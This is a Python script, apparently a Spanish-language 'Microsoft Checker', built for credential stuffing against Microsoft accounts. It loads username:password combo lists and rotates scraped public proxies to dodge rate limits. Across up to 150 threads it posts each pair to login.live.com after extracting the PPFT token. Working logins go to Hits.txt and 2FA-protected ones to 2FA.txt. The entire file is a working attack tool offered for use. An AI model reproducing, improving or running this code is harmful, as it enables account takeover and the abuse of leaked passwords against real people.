#!/usr/bin/env python3
"""
Microsoft Checker v1.2 - Simple & Fast
Con soporte de proxies y archivos locales
"""
import sys
import os
import requests
import time
import random
import re
from tenacity import retry, stop_after_attempt, wait_exponential
import colorama
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Directorio del script
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(SCRIPT_DIR)

colorama.init(autoreset=True)
lock = threading.Lock()
thread_local = threading.local()

# === CONFIGURACIÓN GLOBAL ===
proxy_list = []
proxy_index = 0
use_proxies = False
stats = {"hits": 0, "2fa": 0, "fails": 0, "errors": 0, "checked": 0}

# === FUNCIONES DE PROXY ===
def fetch_proxies_from_api():
    """Obtener proxies de ProxyScrape API."""
    proxies = []
    try:
        print(f"{colorama.Fore.LIGHTYELLOW_EX}[*] Obteniendo proxies de ProxyScrape API...{colorama.Fore.RESET}")
        url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            for line in resp.text.strip().split('\n'):
                line = line.strip()
                if line and ':' in line:
                    proxies.append(f"http://{line}")
        print(f"{colorama.Fore.LIGHTGREEN_EX}[+] Obtenidos {len(proxies)} proxies de API{colorama.Fore.RESET}")
    except Exception as e:
        print(f"{colorama.Fore.LIGHTRED_EX}[-] Error API: {e}{colorama.Fore.RESET}")
    return proxies

def fetch_proxies_from_web():
    """Obtener proxies de free-proxy-list.net."""
    proxies = []
    try:
        print(f"{colorama.Fore.LIGHTYELLOW_EX}[*] Obteniendo proxies de free-proxy-list.net...{colorama.Fore.RESET}")
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        resp = requests.get('https://free-proxy-list.net/', headers=headers, timeout=15)
        if resp.status_code == 200:
            pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})</td><td>(\d+)'
            matches = re.findall(pattern, resp.text)
            for ip, port in matches:
                proxies.append(f"http://{ip}:{port}")
        print(f"{colorama.Fore.LIGHTGREEN_EX}[+] Obtenidos {len(proxies)} proxies{colorama.Fore.RESET}")
    except Exception as e:
        print(f"{colorama.Fore.LIGHTRED_EX}[-] Error: {e}{colorama.Fore.RESET}")
    return proxies

def load_proxies_from_file(filepath):
    """Cargar proxies desde archivo local."""
    proxies = []
    try:
        full_path = os.path.join(SCRIPT_DIR, filepath)
        with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    if not line.startswith('http'):
                        line = f"http://{line}"
                    proxies.append(line)
        print(f"{colorama.Fore.LIGHTGREEN_EX}[+] Cargados {len(proxies)} proxies de {filepath}{colorama.Fore.RESET}")
    except FileNotFoundError:
        print(f"{colorama.Fore.LIGHTRED_EX}[-] Archivo no encontrado: {filepath}{colorama.Fore.RESET}")
    except Exception as e:
        print(f"{colorama.Fore.LIGHTRED_EX}[-] Error: {e}{colorama.Fore.RESET}")
    return proxies

def get_next_proxy():
    """Obtiene el siguiente proxy de forma circular thread-safe."""
    global proxy_index
    if not proxy_list:
        return None
    with lock:
        proxy = proxy_list[proxy_index % len(proxy_list)]
        proxy_index += 1
    return proxy

def get_session(proxy=None):
    """Retorna sesión con o sin proxy."""
    session = requests.Session()
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    return session

# === FUNCIÓN PRINCIPAL DE CHECK ===
@retry(stop=stop_after_attempt(2), wait=wait_exponential(multiplier=1, min=1, max=5), reraise=True)
def check(combo: str) -> dict:
    try:
        user, password = combo.strip().split(':', 1)
    except ValueError:
        return {"status": "invalid", "combo": combo}

    proxy = get_next_proxy() if use_proxies else None
    session = get_session(proxy)
    session.cookies.clear()
    
    result = {"status": "unknown", "combo": combo, "user": user, "proxy": proxy}

    headers_get = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

    # Paso 1: GET login page
    try:
        response_get = session.get(
            'https://login.live.com/login.srf',
            params={'wa': 'wsignin1.0', 'wp': 'MBI_SSL', 'wreply': 'https://account.microsoft.com/'},
            headers=headers_get,
            timeout=20,
            allow_redirects=True
        )
        response_get.raise_for_status()
    except Exception as e:
        raise Exception(f"GET falló: {e}")

    url_referer = response_get.url
    html = response_get.text

    # Extraer PPFT
    PPFT = None
    patterns_ppft = [
        r'value=\\"([^"\\]+)\\"[^>]*name=\\"PPFT\\"',
        r'name=\\"PPFT\\"[^>]*value=\\"([^"\\]+)\\"',
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r"sFT:'([^']+)'",
        r'sFT:"([^"]+)"',
        r'"sFT":"([^"]+)"',
    ]
    for pattern in patterns_ppft:
        match = re.search(pattern, html)
        if match:
            PPFT = match.group(1)
            break
    
    if not PPFT:
        raise Exception("PPFT no encontrado")

    # Extraer URL POST
    urlPostMsa = None
    patterns_url = [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'urlPost:"([^"]+)"',
        r'"urlPostMsa":"([^"]+)"',
    ]
    for pattern in patterns_url:
        match = re.search(pattern, html)
        if match:
            urlPostMsa = match.group(1).replace('\\/', '/').replace('\\u0026', '&')
            break
    
    if not urlPostMsa:
        raise Exception("urlPost no encontrado")

    # Paso 2: POST credenciales
    headers_post = {
        'User-Agent': headers_get['User-Agent'],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.live.com',
        'Referer': url_referer,
        'Upgrade-Insecure-Requests': '1',
    }

    data = {
        'i13': '0',
        'login': user,
        'loginfmt': user,
        'type': '11',
        'LoginOptions': '3',
        'lrt': '',
        'lrtPartition': '',
        'hisRegion': '',
        'hisScaleUnit': '',
        'passwd': password,
        'ps': '2',
        'psRNGCDefaultType': '',
        'psRNGCEntropy': '',
        'psRNGCSLK': '',
        'canary': '',
        'ctx': '',
        'hpgrequestid': '',
        'PPFT': PPFT,
        'PPSX': 'PassportRN',
        'NewUser': '1',
        'FoundMSAs': '',
        'fspost': '0',
        'i21': '0',
        'CookieDisclosure': '0',
        'IsFidoSupported': '1',
        'isSignupPost': '0',
        'isRecoveryAttemptPost': '0',
    }

    try:
        response_post = session.post(urlPostMsa, headers=headers_post, data=data, timeout=20)
    except Exception as e:
        raise Exception(f"POST falló: {e}")

    resp_text = response_post.text
    all_cookies = str(session.cookies.get_dict())

    # Rate limit
    if "Too Many Requests" in resp_text or response_post.status_code == 429:
        raise Exception("Rate Limited")

    # 2FA
    if any(ind in resp_text for ind in [
        'action="https://account.live.com/identity/confirm?',
        'action="https://account.live.com/recover?',
        'action="https://account.live.com/RecoverAccount',
        "Approve sign in request",
        "Help us protect your account",
        'id="iProofEmail"',
        'id="iSelectProofAction"',
        'Enter the code'
    ]):
        result["status"] = "2fa"
        return result

    # Locked/Abuse
    if any(x in resp_text for x in [
        'action="https://account.live.com/ar/cancel?',
        'action="https://account.live.com/Abuse?',
        'tried to sign in too many times',
        'unusual activity',
        'account has been locked'
    ]):
        result["status"] = "locked"
        return result

    # Fail
    if any(err in resp_text for err in [
        "Your account or password is incorrect",
        "That Microsoft account doesn't exist",
        "Votre compte ou mot de passe est incorrect",
        "sErrTxt"
    ]):
        result["status"] = "fail"
        return result

    # Hit
    if "__Host-MSAAUTH" in all_cookies or "Stay signed in?" in resp_text or "Keep me signed in" in resp_text:
        result["status"] = "hit"
        return result

    # Indicios adicionales de locked
    if any(x in resp_text.lower() for x in ['verify your identity', 'suspicious', 'something went wrong']):
        result["status"] = "locked"
        return result

    result["status"] = "unknown"
    return result


def format_result(idx: int, result: dict) -> str:
    """Formatea resultado para consola."""
    combo = result.get("combo", "?")
    status = result.get("status", "unknown")
    proxy = result.get("proxy", "")
    
    idx_str = f"[{str(idx).zfill(4)}]"
    proxy_str = f" [P:{proxy.split('/')[-1][:20]}]" if proxy else ""
    
    if status == "hit":
        return f"{colorama.Fore.LIGHTGREEN_EX}{idx_str} ✅ HIT: {combo}{proxy_str}"
    elif status == "2fa":
        return f"{colorama.Fore.LIGHTYELLOW_EX}{idx_str} ⚠️ 2FA: {combo}{proxy_str}"
    elif status == "locked":
        return f"{colorama.Fore.LIGHTMAGENTA_EX}{idx_str} 🔒 LOCKED: {combo}{proxy_str}"
    elif status == "fail":
        return f"{colorama.Fore.LIGHTRED_EX}{idx_str} ❌ FAIL: {combo}"
    else:
        return f"{colorama.Fore.LIGHTCYAN_EX}{idx_str} ❓ UNKNOWN: {combo}{proxy_str}"


def save_result(result: dict):
    """Guarda resultado en archivo."""
    combo = result.get("combo", "")
    status = result.get("status", "")
    
    with lock:
        stats["checked"] += 1
        
        if status == "hit":
            stats["hits"] += 1
            with open(os.path.join(SCRIPT_DIR, 'Hits.txt'), 'a', encoding='utf-8') as f:
                f.write(f"{combo}\n")
                    
        elif status == "2fa":
            stats["2fa"] += 1
            with open(os.path.join(SCRIPT_DIR, '2FA.txt'), 'a', encoding='utf-8') as f:
                f.write(f"{combo}\n")
                
        elif status == "locked":
            stats["errors"] += 1
                
        elif status == "fail":
            stats["fails"] += 1
        else:
            stats["errors"] += 1


def print_banner():
    print(f"""
{colorama.Fore.LIGHTCYAN_EX}╔═══════════════════════════════════════════════════╗
║     Microsoft Checker v1.2 - Simple & Fast        ║
║     Con soporte de Proxies y archivos locales     ║
╚═══════════════════════════════════════════════════╝{colorama.Fore.RESET}
    """)


def print_stats():
    """Muestra estadísticas."""
    print(f"\n{colorama.Fore.LIGHTCYAN_EX}{'='*50}")
    print(f"{colorama.Fore.LIGHTGREEN_EX}✅ Hits: {stats['hits']}")
    print(f"{colorama.Fore.LIGHTYELLOW_EX}⚠️  2FA: {stats['2fa']}")
    print(f"{colorama.Fore.LIGHTRED_EX}❌ Fails: {stats['fails']}")
    print(f"{colorama.Fore.LIGHTWHITE_EX}❓ Otros: {stats['errors']}")
    print(f"{colorama.Fore.LIGHTCYAN_EX}📊 Total: {stats['checked']}")
    print(f"{'='*50}\n{colorama.Fore.RESET}")


def setup_proxies():
    """Configuración de proxies."""
    global proxy_list, use_proxies
    
    print(f"\n{colorama.Fore.LIGHTYELLOW_EX}=== Configuración de Proxies ==={colorama.Fore.RESET}")
    print("1) Sin proxies (directo)")
    print("2) Cargar desde archivo local (proxies.txt)")
    print("3) Obtener de ProxyScrape API (~900+) [RECOMENDADO]")
    print("4) Obtener de free-proxy-list.net (~300)")
    print("5) Combinar todas las fuentes")
    
    choice = input(f"\n{colorama.Fore.LIGHTYELLOW_EX}Selecciona (1-5) [default: 1]: {colorama.Fore.RESET}").strip() or "1"
    
    if choice == "1":
        use_proxies = False
        print(f"{colorama.Fore.LIGHTGREEN_EX}[+] Modo directo (sin proxies){colorama.Fore.RESET}")
        return
    
    use_proxies = True
    
    if choice == "2":
        filepath = input(f"{colorama.Fore.LIGHTYELLOW_EX}Archivo [proxies.txt]: {colorama.Fore.RESET}").strip() or "proxies.txt"
        proxy_list = load_proxies_from_file(filepath)
    
    elif choice == "3":
        proxy_list = fetch_proxies_from_api()
    
    elif choice == "4":
        proxy_list = fetch_proxies_from_web()
    
    elif choice == "5":
        proxy_list = fetch_proxies_from_api()
        proxy_list.extend(fetch_proxies_from_web())
        filepath = input(f"{colorama.Fore.LIGHTYELLOW_EX}Archivo adicional (Enter para omitir): {colorama.Fore.RESET}").strip()
        if filepath:
            proxy_list.extend(load_proxies_from_file(filepath))
    
    if not proxy_list:
        print(f"{colorama.Fore.LIGHTRED_EX}[!] No se encontraron proxies, usando modo directo{colorama.Fore.RESET}")
        use_proxies = False
    else:
        proxy_list = list(set(proxy_list))  # Eliminar duplicados
        random.shuffle(proxy_list)
        print(f"{colorama.Fore.LIGHTGREEN_EX}[+] Total proxies: {len(proxy_list)}{colorama.Fore.RESET}")


def main():
    print_banner()
    
    # Configurar proxies
    setup_proxies()
    
    # Cargar combos
    combo_file = input(f"\n{colorama.Fore.LIGHTYELLOW_EX}Archivo de combos [combo.txt]: {colorama.Fore.RESET}").strip() or 'combo.txt'
    
    try:
        full_path = os.path.join(SCRIPT_DIR, combo_file)
        with open(full_path, encoding='utf-8') as f:
            combos = [line.strip() for line in f if ':' in line.strip()]
    except Exception as e:
        print(f"{colorama.Fore.RED}Error: {e}{colorama.Fore.RESET}")
        sys.exit(1)

    if not combos:
        print(f"{colorama.Fore.RED}No hay combos válidos.{colorama.Fore.RESET}")
        sys.exit(1)

    print(f"{colorama.Fore.LIGHTGREEN_EX}[+] Cargados: {len(combos)} combos{colorama.Fore.RESET}")
    
    # Threads: 150 con proxies, 30 sin proxies
    default_threads = 150 if use_proxies else 30
    try:
        max_threads = int(input(f"{colorama.Fore.LIGHTYELLOW_EX}Threads [{default_threads}]: {colorama.Fore.RESET}").strip() or str(default_threads))
    except:
        max_threads = default_threads

    print(f"\n{colorama.Fore.LIGHTCYAN_EX}[*] Iniciando con {max_threads} threads...{colorama.Fore.RESET}\n")
    
    processed = set()
    start_time = time.time()

    try:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = {executor.submit(check, combo): combo for combo in combos}
            
            for idx, future in enumerate(as_completed(futures), start=1):
                combo = futures[future]
                try:
                    result = future.result(timeout=60)
                    print(format_result(idx, result))
                    save_result(result)
                    processed.add(combo)
                except Exception as ex:
                    error_msg = str(ex)
                    print(f"{colorama.Fore.RED}[{str(idx).zfill(4)}] Error: {combo[:35]}... - {error_msg[:35]}{colorama.Fore.RESET}")
                    if "Rate Limited" not in error_msg and "Too Many" not in error_msg:
                        processed.add(combo)
                        stats["errors"] += 1
                        stats["checked"] += 1
    except KeyboardInterrupt:
        print(f"\n{colorama.Fore.LIGHTYELLOW_EX}[!] Deteniendo...{colorama.Fore.RESET}")

    # Guardar restantes
    remaining = [c for c in combos if c not in processed]
    with open(os.path.join(SCRIPT_DIR, combo_file), 'w', encoding='utf-8') as f:
        f.write("\n".join(remaining) + "\n" if remaining else "")

    elapsed = time.time() - start_time
    print_stats()
    print(f"{colorama.Fore.LIGHTGREEN_EX}✅ Completado en {elapsed:.1f}s ({stats['checked']/max(elapsed,1):.1f} checks/seg)")
    print(f"{colorama.Fore.LIGHTYELLOW_EX}📁 Restantes: {len(remaining)}{colorama.Fore.RESET}")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"{colorama.Fore.RED}Error: {e}{colorama.Fore.RESET}")
    finally:
        print_stats()
        time.sleep(0.3)
